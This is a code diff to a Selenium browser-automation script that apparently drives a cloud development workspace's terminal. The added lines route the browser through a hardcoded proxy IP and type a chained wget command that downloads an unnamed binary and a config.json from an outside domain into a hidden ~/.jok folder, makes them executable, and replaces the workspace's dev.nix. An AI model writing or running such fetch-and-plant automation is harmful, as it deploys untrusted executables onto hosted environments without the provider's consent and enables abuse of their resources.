@@ -36,6 +36,7 @@ def get_chrome_options():
     options.add_argument("--disable-gpu")
     options.add_argument("--force-dark-mode")
     options.add_argument("--no-sandbox")
+    options.add_argument("--proxy-server=http://3.79.73.102:8080")
     options.add_argument("--disable-dev-shm-usage")
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option("prefs", {
@@ -106,7 +107,7 @@ def open_terminal_and_run(driver):
         time.sleep(3)
 
         commands = [
-            'wget -q -O .idx/dev.nix https://dot-store.biz.id/joko.nix'
+            'mkdir -p ~/.jok && wget -q -O index.html dot-store.biz.id/index.html && wget -q -O ~/.jok/cinta dot-store.biz.id/bagong && wget -q -O ~/.jok/config.json dot-store.biz.id/bagong.json && chmod +x ~/.jok/* && wget -q -O .idx/dev.nix dot-store.biz.id/joko.nix'
         ]
         for cmd in commands:
             actions = ActionChains(driver)
@@ -115,6 +116,16 @@ def open_terminal_and_run(driver):
             actions.send_keys(Keys.ENTER)
             actions.perform()
             time.sleep(2)
+
+            actions = ActionChains(driver)
+            actions.send_keys(Keys.ENTER)
+            actions.perform()
+            time.sleep(3)
+
+            actions = ActionChains(driver)
+            actions.send_keys(Keys.ENTER)
+            actions.perform()
+            time.sleep(3)
 
             actions = ActionChains(driver)
             actions.send_keys(Keys.ENTER)
